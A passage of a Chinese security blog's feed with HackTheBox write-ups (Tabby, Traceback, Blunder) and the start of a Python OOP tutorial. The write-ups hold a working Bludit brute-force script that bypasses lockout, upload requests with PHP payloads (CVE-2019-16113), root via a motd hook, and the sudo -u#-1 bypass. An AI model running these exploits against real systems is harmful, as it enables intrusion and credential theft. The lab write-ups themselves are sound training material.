dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
root@wh1sper:/usr/share/wordlists# gzip -d rockyou.txt.gz 
root@wh1sper:/usr/share/wordlists# ls
dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  wfuzz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开始爆破：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/HTB/machine/Tabby# john zippass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
admin@it         (1.zip)
1g 0:00:00:00 DONE (2020-07-21 07:47) 1.562g/s 16192Kp/s 16192Kc/s 16192KC/s adnc153..adenabuck
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
root@wh1sper:~/HTB/machine/Tabby#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;，，，秒出，使用密码 &lt;code&gt;admin@it&lt;/code&gt; 解压。&lt;/p&gt;
&lt;h4 id=&#34;提权ash用户&#34;&gt;提权ash用户&lt;/h4&gt;
&lt;p&gt;不过解压出来之后我们并不能发现压缩包里面有什么特别的，之前读取/etc/passwd的时候我们看到了有个ash用户，于是尝试用这个密码来登录ash用户：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;su ash
Password: admin@it
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;果然可以成功！/home/user.txt就可以拿到手了&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HackTheBox::Traceback</title>
        <link>https://anthem-whisper.github.io/p/hacktheboxtraceback/</link>
        <pubDate>Fri, 17 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hacktheboxtraceback/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180751.png" alt="Featured image of post HackTheBox::Traceback" /&gt;&lt;p&gt;打开是一个黑页&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180759.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;看源码有一句hint：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;利用已有的webshell获得webadmin权限&#34;&gt;利用已有的webshell获得webadmin权限&lt;/h3&gt;
&lt;p&gt;扫目录，无果，尝试直接Google这句话，果然找到了作者的Github，在作者列出的一堆shell里面一个个尝试，最后找到了&lt;a class=&#34;link&#34; href=&#34;https://github.com/Xh4H/Web-Shells/blob/master/smevk.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;smevk.php&lt;/a&gt;，用户密码admin就进去了，然后直接上传文件getshell。&lt;/p&gt;
&lt;p&gt;在/home目录下发现两个文件夹，其中sysadmin没有权限访问，webadmin里面有个note.txt：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- sysadmin -
I have left a tool to practice Lua.
I&#39;m sure you know where to find it.
Contact me if you have any question.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后我们可以查看webadmin的.bash_history：&lt;/p&gt;
&lt;p&gt;.bash_history&lt;/p&gt;
&lt;p&gt;好吧其实这才是原版：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概就是通过 &lt;code&gt;/home/sysadmin/luvit&lt;/code&gt; 这个东西来执行lua脚本，找了半天并没有找到privesc.lua，我们可以新建一个来执行，由于lua可以用sysadmin权限执行，我们得以读取/home/sysadmin/user.txt；&lt;/p&gt;
&lt;p&gt;查看webadmin的权限：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(webadmin:/var/www/html) $ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
(webadmin:/var/www/html) $
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;privesc.lua：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;os.execute(&amp;quot;ls /home/sysadmin/&amp;quot;)
os.execute(&amp;quot;cat /home/sysadmin/user.txt&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;两次分别用蚁剑终端执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
luvit
user.txt
(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
faca73f508ba5f752100d6de13500714
(webadmin:/home/webadmin) $
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;写公钥获得sysadmin的ssh&#34;&gt;写公钥获得sysadmin的SSH&lt;/h3&gt;
&lt;p&gt;运行命令生成RAS公私钥对：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh-keygen -t rsa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;保存到当前目录，我们可以看到生成了两个文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/HTB/machine/Traceback# ls -a
.  ..  id_rsa  id_rsa.pub  pspy64  pspy64s  unix-privesc-check  unix-privesc-check.tar
root@wh1sper:~/HTB/machine/Traceback#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;code&gt;id_rsa.pub&lt;/code&gt; 是公钥，我们利用webshell把他上传到 &lt;code&gt;/home/username/.ssh/authorized_keys&lt;/code&gt; 这个文件里面就可以获得这个user的权限。&lt;/p&gt;
&lt;p&gt;既然lua脚本可以读写sysadmin的目录，我们便利用他写sysadmin的公钥：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180809.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;随后执行命令，用私钥登录SSH：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh -i id_rsa sysadmin@10.10.10.181
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到我们是sysadmin了。&lt;/p&gt;
&lt;h3 id=&#34;利用pspy工具在没有root的情况下监视高权限进程&#34;&gt;利用pspy工具在没有root的情况下监视高权限进程&lt;/h3&gt;
&lt;p&gt;pspy工具地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34;&gt;https://github.com/DominicBreuker/pspy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Tib3rius/pspy&#34;&gt;https://github.com/Tib3rius/pspy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;利用webshell上传到服务器，在当前目录执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./pspy64 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180819.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可以看到&lt;/p&gt;
&lt;p&gt;标机器每30秒会执行一个cp命令，把一些文件从backup目录复制到/etc/update-motd.d/&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们去查看这个目录下有什么东西：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cd /etc/update-motd.d/
$ pwd
/etc/update-motd.d
$ ls
00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 
[ -r /etc/lsb-release ] &amp;amp;&amp;amp; . /etc/lsb-release
 
 
echo &amp;quot;\nWelcome to Xh4H land \n&amp;quot;
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;是不是很熟悉呢？在刚刚登录的时候也是见到了这句话： &lt;code&gt;Welcome to Xh4H land&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180829.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;随后我们监视到，每次登录SSH都会执行以下命令：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180839.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;其中能找到这样一条：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CMD: UID=0    PID=2007   | /bin/sh /etc/update-motd.d/00-header
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;利用root权限运行的脚本弹shell&#34;&gt;利用root权限运行的脚本弹shell&lt;/h3&gt;
&lt;p&gt;目的很明确了，这个00-header脚本是用root执行的，我们测试一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ echo &#39;id&#39; &amp;gt;&amp;gt; 00-header
$ exit
root@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
 
Welcome to Xh4H land 
 
uid=0(root) gid=0(root) groups=0(root)
 
 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
Last login: Sat Jul 18 02:23:33 2020 from 10.10.14.98
$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;id被执行了。不过这个00-header文件好像一直在被还原，手速要快。&lt;/p&gt;
&lt;p&gt;弹之：&lt;/p&gt;
&lt;p&gt;&lt;del&gt;md蜜汁环境弹不过来&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;反正我们知道/root/root.txt，直接&lt;code&gt;echo &#39;cat /root/root.txt&#39; &amp;gt;&amp;gt; 00-header&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后登录就能看到了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &#39;cat /root/root.txt&#39; &amp;gt;&amp;gt; 00-headerroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
 
Welcome to Xh4H land 
 
96c02bb36b51b8f45d59482a4b0c1aba
 
 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
Last login: Sat Jul 18 02:31:58 2020 from 10.10.14.98
$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;环境一直有人搅屎。。。建议在美国晚上的时候打&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HackTheBox::Blunder</title>
        <link>https://anthem-whisper.github.io/p/hacktheboxblunder/</link>
        <pubDate>Thu, 16 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hacktheboxblunder/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png" alt="Featured image of post HackTheBox::Blunder" /&gt;&lt;p&gt;玩一手HTB&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180614.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 &lt;code&gt;Bludit&lt;/code&gt; cms&lt;/p&gt;
&lt;p&gt;在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-17240httpsgithubcombluditbluditpull1090&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bludit/bludit/pull/1090&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2019-17240&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Bludit是一套开源的轻量级博客内容管理系统（CMS）。&lt;/p&gt;
&lt;p&gt;Bludit 3.9.2版本中的 &lt;code&gt;bl-kernel/security.class.php&lt;/code&gt; 一些代码将检查主机进行的错误登录尝试次数。如果主机进行10次不正确的尝试，则会暂时阻止它们，以减轻暴力破解的企图。攻击者通过使用多个伪造的X-Forwarded-For或Client-IP HTTP标头利用该漏洞绕过保护机制。&lt;/p&gt;
&lt;p&gt;爆破了半天，无果。&lt;/p&gt;
&lt;p&gt;看了wp之后，我们找到了本来没有被dirsearch扫到的&lt;code&gt;/todo.txt&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以猜到用户名可能是 &lt;code&gt;fergus&lt;/code&gt; ，但是密码需要用到&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/7906cc79fb9c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;cewl&lt;/a&gt;来生成弱口令字典&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180623.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;然后我们利用改装过后的CVE-2019-17240的&lt;a class=&#34;link&#34; href=&#34;https://github.com/bludit/bludit/pull/1090&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;poc&lt;/a&gt;来打：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import re
import requests
 
def open_ressources(file_path):
    return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]
 
host = &#39;http://10.10.10.191&#39;
login_url = host + &#39;/admin/login&#39;
username = &#39;fergus&#39;
wordlist = open_ressources(&#39;wordlist.txt&#39;)
 
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search(&#39;input.+?name=&amp;quot;tokenCSRF&amp;quot;.+?value=&amp;quot;(.+?)&amp;quot;&#39;, login_page.text).group(1)
 
    print(&#39;[*] Trying: {p}&#39;.format(p = password))
 
    headers = {
        &#39;X-Forwarded-For&#39;: password,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;,
        &#39;Referer&#39;: login_url
    }
 
    data = {
        &#39;tokenCSRF&#39;: csrf_token,
        &#39;username&#39;: username,
        &#39;password&#39;: password,
        &#39;save&#39;: &#39;&#39;
    }
 
    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
 
    if &#39;location&#39; in login_result.headers:
        if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]:
            print()
            print(&#39;SUCCESS: Password found!&#39;)
            print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password))
            print()
            break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180633.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;最后在第一百多位爆破出用户名&lt;code&gt;fergus&lt;/code&gt;密码&lt;code&gt;RolandDeschain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进入后台。&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-16113httpsgithubcombluditbluditissues1081&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bludit/bludit/issues/1081&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2019-16113&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;文章说的很详细，通过更改uuid的值来指定上传文件的位置，也就是目录穿越&lt;/p&gt;
&lt;p&gt;然后不符合图片后缀的文件会先被移动到/bl-content/tmp/temp/目录下，然后进行删除，我们利用intruder进行条件竞争&lt;/p&gt;
&lt;p&gt;上传.htaccess文件，把jpg解析为php：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.§191§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 560
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;images[]&amp;quot;; filename=&amp;quot;.htaccess&amp;quot;
Content-Type: image/jpeg
 
RewriteEngine off
AddType application/x-httpd-php jpg
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;uuid&amp;quot;
 
21b8a0e80e433cb7453e7d72382c6bc1
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;tokenCSRF&amp;quot;
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传恶意wh1sper.jpg到/bl-content/tmp/temp/目录：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.§191§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 589
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;images[]&amp;quot;; filename=&amp;quot;wh1sper.jpg&amp;quot;
Content-Type: image/jpeg
 
&amp;lt;?php file_put_contetns(&amp;quot;../wh1sper.php&amp;quot;,&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;);?&amp;gt;
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;uuid&amp;quot;
 
21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&amp;quot;tokenCSRF&amp;quot;
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得shell：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180645.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;拿到了shell之后根目录并没有我们想要的东西，我们这个账户并没有权限查看/root目录；&lt;/p&gt;
&lt;p&gt;我们可以在www目录下看到另外一个版本的bludit，并且再user.php里面可以找到另外一个账户的账号密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180653.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180703.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;利用kali自带的 &lt;code&gt;hash-identifier&lt;/code&gt; 进行识别：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d
 
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://md5decrypt.net/en/Sha1/&#34;&gt;https://md5decrypt.net/en/Sha1/&lt;/a&gt;解码得到:&lt;code&gt;Password120&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;冰蝎终端：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;su hugo
Password120
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们切换到了hugo用户，但是还是没有root权限&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hugo@blunder:/var/www/bludit-3.9.2$ sudo -l
 
Password: Password120
 
Matching Defaults entries for hugo on blunder:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User hugo may run the following commands on blunder:
(ALL, !root) /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cve-2019-14287httpswwwexploit-dbcomexploits47502&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/47502&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2019-14287&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Google &lt;code&gt;(ALL, !root) /bin/bash&lt;/code&gt; 之后可以用&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/47502&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这种方式&lt;/a&gt;提权：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hugo@blunder:/var/www/bludit-3.9.2$ sudo -u#-1 /bin/bash
 
root@blunder:/var/www/bludit-3.9.2# cat /root/root.txt
 
b1466707cf5be5f66b8be2c4a525e066
root@blunder:/var/www/bludit-3.9.2#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就可以得到root.txt了，另外home目录下还有个user.txt&lt;/p&gt;
</description>
        </item>
        <item>
        <title>python面向对象基础学习</title>
        <link>https://anthem-whisper.github.io/p/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</link>
        <pubDate>Thu, 09 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228095632.jpeg" alt="Featured image of post python面向对象基础学习" /&gt;&lt;p&gt;说了暑假学开发，绝对不咕咕咕（0%）&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;面向过程&#34;&gt;面向过程&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171712.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;假如你拥有了一个做饭洗碗的任务，你准备用面向过程的思想来解决它&lt;/p&gt;
&lt;p&gt;可以看到过程非常的繁琐，你将面对所有的步骤&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;面向对象&#34;&gt;面向对象&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171728.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171728.png&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;假如你现在有个对象，她拥有两个技能：&lt;/p&gt;
&lt;p&gt;1.做饭
2.洗碗&lt;/p&gt;
&lt;p&gt;那么你只需要面向你的对象，然后你的对象去处理其他所有过程&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171745.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那如果你的对象再拥有两个对象：&lt;/p&gt;
&lt;p&gt;1.炒菜机
2.洗碗机&lt;/p&gt;
&lt;p&gt;那么她只需要每次都做三个动作，不必一次面向所有步骤&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;很妙！对不对？&lt;/p&gt;
&lt;p&gt;你只需要对你的对象说需要做什么，然后你的对象就会帮你做好所有的事情，&lt;strong&gt;你既看不到具体的过程，你也不需要知道具体的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;你的对象也不需要知道具体的炒菜或者洗碗的步骤，她只需对洗碗机或者炒菜机说需要做什么，洗碗机或者炒菜机就会帮她做完所有的步骤&lt;/p&gt;
&lt;p&gt;这个就叫做&lt;strong&gt;封装&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;把搅拌、翻炒、监测火候封装成自动炒菜机
把倒洗洁精、刷碗、擦干水封装成自动洗碗机
再把剩下的封装成你的女朋友&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;两者的对比&#34;&gt;两者的对比&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;面向对象本身是对面向过程的&lt;strong&gt;封装&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;面向过程什么最重要？
&lt;ul&gt;
&lt;li&gt;按步骤划分&lt;/li&gt;
&lt;li&gt;把每个任务，分解成具体的每个步骤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面向对象什么最重要？
&lt;ul&gt;
&lt;li&gt;按功能就行划分&lt;/li&gt;
&lt;li&gt;找到对象，确定对象的属性、行为&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何从面向过程思想转化为面向对象思想？
&lt;ol&gt;
&lt;li&gt;和面向过程一样，先找到所有步骤&lt;/li&gt;
&lt;li&gt;试图分离功能代码块&lt;/li&gt;
&lt;li&gt;将这些功能代码块，划分到某对象中&lt;/li&gt;
&lt;li&gt;根据对象行为，抽象出 “类”&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;对象和类的关系
&lt;ul&gt;
&lt;li&gt;对象-&amp;gt;抽象-&amp;gt;类-&amp;gt;实例化-&amp;gt;对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;对象和类&#34;&gt;对象和类&lt;/h3&gt;
&lt;p&gt;对象和类里面有两个东西：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;属性&lt;/li&gt;
&lt;li&gt;方法&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;属性是静态的、用来描述这个类或者对象本身的变量&lt;/p&gt;
&lt;p&gt;比如，张三这个对象，他的属性有年龄、性别、身高、体重
人这个类属性也有年龄、性别、身高、体重&lt;/p&gt;
&lt;p&gt;张三能执行吃饭这个动作，这就是他的一个&lt;strong&gt;方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在我们来新建一个类，把他实例化为一个对象并且给他一些属性：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# python3
class Person:
    pass
 
zhangsan = Person()#实例化为对象
 
zhangsan.age = 19#给zhangsan对象添加一个属性age并且赋值为19
zhangsan.height = 190#给zhangsan对象添加一个属性height并且赋值为190
 
print(zhangsan.age)#测试能否访问这个属性
